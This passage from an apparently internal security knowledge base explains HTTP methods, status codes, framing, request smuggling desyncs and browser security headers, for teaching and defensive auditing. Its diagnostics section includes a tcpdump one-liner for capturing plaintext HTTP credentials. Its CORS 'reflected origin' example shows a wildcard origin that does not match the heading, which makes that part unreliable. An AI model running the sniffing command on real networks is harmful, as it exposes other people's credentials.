│ **POST**│ ❌ No        │ ❌ No         │ Submits data to be processed by target URI;   │
│         │              │               │ alters server state; creates new resources.   │
├─────────┼──────────────┼───────────────┼───────────────────────────────────────────────┤
│ **HEAD**│ ✅ **Yes**   │ ✅ **Yes**    │ Identical to GET, but server returns **zero   │
│         │              │               │ response body** (Used for fast cache audits). │
├─────────┼──────────────┼───────────────┼──────────────────────────────────────────────┤
│ **PUT** │ ❌ No        │ ✅ **Yes**    │ Replaces entire target resource with payload. │
│         │              │               │ Dangerous if misconfigured (Arbitrary upload).│
├─────────┼──────────────┼───────────────┼───────────────────────────────────────────────┤
│**DELETE** ❌ No        │ ✅ **Yes**    │ Deletes specified target resource.            │
├─────────┼──────────────┼───────────────┼───────────────────────────────────────────────┤
│**OPTIONS** ✅ **Yes**  │ ✅ **Yes**    │ Queries allowed methods (**CORS Preflight**).  │
├─────────┼──────────────┼───────────────┼───────────────────────────────────────────────┤
│**TRACE**│ ✅ **Yes**   │ ✅ **Yes**    │ Echoes request back to client. **XST Attack:**│
│         │              │               │ Cross-Site Tracing steals `HttpOnly` cookies! │
└─────────┴──────────────┴───────────────┴───────────────────────────────────────────────┘
```

* **Safe:** Does not modify the primary resource state on the target server.
* **Idempotent:** Executing the request multiple times produces the exact same server side-effects as executing it once (e.g., executing `DELETE /user/5` ten times has the same outcome as executing it once; whereas `POST /charge` ten times charges the user ten times!).

---

### Status Codes Reference Matrix

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        HTTP STATUS CODE ARCHITECTURAL MATRIX                           │
├───────┬──────────────────┬─────────────────────────────────────────────────────────────┤
│ Class │ Category         │ Critical Codes & Security Significance                      │
├───────┼──────────────────┼─────────────────────────────────────────────────────────────┤
│ **1xx**│ Informational    │ `101 Switching Protocols` (Upgrades HTTP to WebSockets).    │
├───────┼──────────────────┼─────────────────────────────────────────────────────────────┤
│ **2xx**│ Success          │ `200 OK` (Standard success).                                │
│       │                  │ `204 No Content` (Success, no response body returned).      │
│       │                  │ `206 Partial Content` (Range request; byte slicing).        │
├───────┼──────────────────┼─────────────────────────────────────────────────────────────┤
│ **3xx**│ Redirection      │ `301 Moved Permanently` (Cached permanently; breaks POST).  │
│       │                  │ `302 Found` (Temporary redirect; legacy method changes).    │
│       │                  │ `304 Not Modified` (Conditional GET match; cache hit).      │
│       │                  │ `307 Temporary` / `308 Permanent` (Preserves method & body).│
├───────┼──────────────────┼─────────────────────────────────────────────────────────────┤
│ **4xx**│ Client Error     │ `400 Bad Request` (Malformed syntax; smuggling indicator).  │
│       │                  │ `401 Unauthorized` (Missing/invalid authentication).        │
│       │                  │ `403 Forbidden` (Authenticated, but access denied).         │
│       │                  │ `404 Not Found` (Resource does not exist).                  │
│       │                  │ `405 Method Not Allowed` (e.g., GET on a POST-only route).  │
├───────┼──────────────────┼─────────────────────────────────────────────────────────────┤
│ **5xx**│ Server Error     │ `500 Internal Server Error` (Unhandled exception / crash).  │
│       │                  │ `502 Bad Gateway` (Upstream reverse proxy connection failed)│
│       │                  │ `504 Gateway Timeout` (Backend failed to answer proxy).     │
└───────┴──────────────────┴─────────────────────────────────────────────────────────────┘
```

---

## 3. Message Framing: `Content-Length` vs `Transfer-Encoding`

HTTP/1.1 uses persistent TCP connections (`Connection: keep-alive`) by default to eliminate handshake latency. To delineate where one request ends and the next begins over a single TCP stream, HTTP provides two distinct framing mechanisms:

```
    CONTENT-LENGTH FRAMING (Static Length)          CHUNKED TRANSFER ENCODING (Streaming)
  ┌────────────────────────────────────────┐     ┌────────────────────────────────────────┐
  │ Content-Length: 15\r\n                 │     │ Transfer-Encoding: chunked\r\n         │
  │ \r\n                                   │     │ \r\n                                   │
  │ 15 Bytes of Exact Payload Data Buffer  │     │ 4\r\n                                  │
  └────────────────────────────────────────┘     │ Wiki\r\n (4-byte chunk)                │
                                                 │ 5\r\n                                  │
                                                 │ pedia\r\n (5-byte chunk)               │
                                                 │ 0\r\n\r\n (Terminating Chunk: Size 0)  │
                                                 └────────────────────────────────────────┘
```

---

### 1. `Content-Length` Header
Specifies the exact decimal byte size of the payload body. The receiving parser reads exactly $N$ bytes following the double CRLF and stops.
* **Risk:** If `Content-Length` is smaller than the actual body, trailing data leaks into the next request. If larger, the connection hangs waiting for bytes until timeout.

---

### 2. `Transfer-Encoding: chunked`
Used when the total content size is unknown at transmission start (e.g., dynamic database streams):
* The body is split into a series of chunks.
* Each chunk begins with the **chunk size in hexadecimal**, followed by `\r\n`, followed by the chunk data, followed by `\r\n`.
* **The Termination Sentinel:** The stream ends with a **zero-sized chunk: `0\r\n\r\n`**.

---

## 4. The Request Smuggling Engine (CL.TE / TE.CL Desynchronization)

**HTTP Request Smuggling (RFC 7230 Ambiguity Exploitation)** occurs when an edge reverse proxy (e.g., Cloudflare, Nginx, AWS ALB) and a back-end web application server parse request boundaries differently.

```
       [ ATTACKER ]
            │
            │ Injects crafted request containing BOTH:
            │ - Content-Length: 13
            │ - Transfer-Encoding: chunked
            ▼
    ┌──────────────────────┐
    │  FRONT-END PROXY     │ ──> Parses via CONTENT-LENGTH (Sees single 13-byte request)
    └──────────┬───────────┘
               │
               ▼ (Forwards continuous TCP stream to Backend)
    ┌──────────────────────┐
    │  BACK-END SERVER     │ ──> Parses via CHUNKED ENCODING (Sees zero chunk '0' and stops early!)
    └──────────┬───────────┘
               │
               ▼
   [ TRAILING DATA SMUGGLED INTO BACKEND QUEUE! ]
   The leftover bytes prefix the NEXT innocent user's request, hijacking their session!
```

---

### The Two Primary Smuggling Desynchronizations

| Smuggling Variant | Front-End Parser Behavior | Back-End Parser Behavior | Exploitation Vector |
| :--- | :--- | :--- | :--- |
| **`CL.TE`** | Uses `Content-Length` | Uses `Transfer-Encoding` | Frontend forwards entire payload; Backend stops early at `0\r\n\r\n`, leaving trailing data as a smuggled prefix. |
| **`TE.CL`** | Uses `Transfer-Encoding` | Uses `Content-Length` | Frontend processes chunks; Backend reads partial bytes, leaving remaining chunk data in the socket pipeline. |

> 🛡️ **RFC 7230 §3.3.3 Mandate:**  
> If an incoming request contains **both** `Content-Length` and `Transfer-Encoding`, the server **MUST** prioritize `Transfer-Encoding` and strip or reject `Content-Length`. Servers that fail to enforce this rule are vulnerable to smuggling.

---

## 5. Modern Browser Security Headers Architecture

Web security headers are HTTP response directives that instruct client browsers to enforce strict sandboxing, cryptographic constraints, and execution boundaries.

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        ENTERPRISE SECURITY HEADERS SUITE                               │
├──────────────────────────┬─────────────────────────────────────────────────────────────┤
│ Security Header          │ Core Defensive Protection                                   │
├──────────────────────────┼─────────────────────────────────────────────────────────────┤
│ **`HSTS`**               │ Enforces HTTPS; blocks SSL Stripping attacks                │
│ **`CSP`**                │ Restricts script sources; mitigates Cross-Site Scripting    │
│ **`X-Frame-Options`**    │ Blocks UI Redressing and Clickjacking attacks               │
│ **`X-Content-Type-Opt`** │ Disables MIME-Type sniffing; forces strict content types    │
│ **`CORS`**               │ Governs cross-origin API read access permissions            │
└──────────────────────────┴─────────────────────────────────────────────────────────────┘
```

---

### 1. HTTP Strict Transport Security (HSTS — RFC 6797)
Instructs the browser that the domain must **NEVER be accessed over insecure HTTP**:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```
* `max-age=63072000`: Enforces HTTPS for 2 years ($63,072,000\text{ seconds}$).
* `includeSubDomains`: Applies policy to all subdomains (e.g., `api.target.com`).
* `preload`: Authorizes inclusion in Google's hardcoded browser **HSTS Preload List**, ensuring the browser uses HTTPS on the very first connection attempt (Eliminating the initial plaintext redirect window).

---

### 2. Content Security Policy (CSP — Level 3 Specification)
Restricts which execution origins are permitted to load scripts, styles, images, and fonts, neutralizing **Cross-Site Scripting (XSS)**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com 'nonce-R4nd0m1337'; object-src 'none'; frame-ancestors 'none';
```
* `default-src 'self'`: Restricts all resources to the current origin by default.
* `script-src ... 'nonce-R4nd0m1337'`: **Cryptographic Nonce Execution:** Only inline scripts containing matching `<script nonce="R4nd0m1337">` attributes will execute; injected attacker scripts without the secret dynamic nonce are blocked!
* `object-src 'none'`: Disables dangerous legacy plugins (Flash, Java Applets).
* `frame-ancestors 'none'`: Replaces `X-Frame-Options` to block Clickjacking.

---

### 3. Clickjacking Mitigation (`X-Frame-Options`)
Prevents malicious websites from rendering the target page inside an invisible `<iframe>` to trick users into clicking buttons (**UI Redressing**):

```http
X-Frame-Options: DENY
```
* `DENY`: The page cannot be displayed in a frame, regardless of the site attempting to do so.
* `SAMEORIGIN`: The page can only be framed by pages sharing the exact same origin (Protocol, Domain, Port).

---

### 4. MIME-Sniffing Defense (`X-Content-Type-Options`)
```http
X-Content-Type-Options: nosniff
```
* **The Vulnerability:** If a user uploads an image containing malicious JavaScript (`avatar.jpg`), legacy browsers "sniff" the bytes, ignore the `Content-Type: image/jpeg` header, and execute the file as JavaScript!
* **The Defense:** `nosniff` forces the browser to adhere strictly to the declared `Content-Type`. If the MIME type does not match the file structure, execution is blocked.

---

### 5. Cross-Origin Resource Sharing (CORS Architecture)

By default, the browser's **Same-Origin Policy (SOP)** blocks a web page on `evil.com` from reading API responses from `bank.com`. **CORS** allows servers to selectively relax this restriction.

```
       [ evil.com Web Script ] ──( fetch('https://bank.com/api/balance') )──> [ bank.com API Server ]
                                                                                   │
                                                                                   ▼
       [ BROWSER SOP CHECK ] ◄──( Returns Response Headers )───────────────────────┘
       Access-Control-Allow-Origin: https://evil.com
       Access-Control-Allow-Credentials: true
```

#### The Deadly CORS Misconfiguration (Reflected Origin):
```http
# Insecure Backend Logic:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
* ⚠️ **Security Flaw:** If a server reflects the client's `Origin` header dynamically while setting `Access-Control-Allow-Credentials: true`, an attacker can host a malicious script that sends authenticated requests (including session cookies) to the API and reads private user data!

---

## 6. Live Protocol Diagnostics & Security Audits

```bash
# 1. Full Verbose HTTP/1.1 Transaction via curl (Inspects raw wire headers)
curl -v -X GET https://target.com/api/health

# 2. Audit All Security Headers of a Target Web Service
curl -s -I -L https://target.com | grep -Ei "strict-transport|content-security|x-frame|x-content-type|access-control"

# 3. Transmit Raw HTTP/1.1 Request over Raw Netcat Socket
nc target.com 80 << EOF
GET / HTTP/1.1
Host: target.com
Connection: close

EOF

# 4. Capture Live Plaintext HTTP Credentials via tcpdump
sudo tcpdump -i eth0 -nn -A -s0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
# 0x504F5354 = Hex for "POST". Carves POST request bodies in ASCII!
```

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
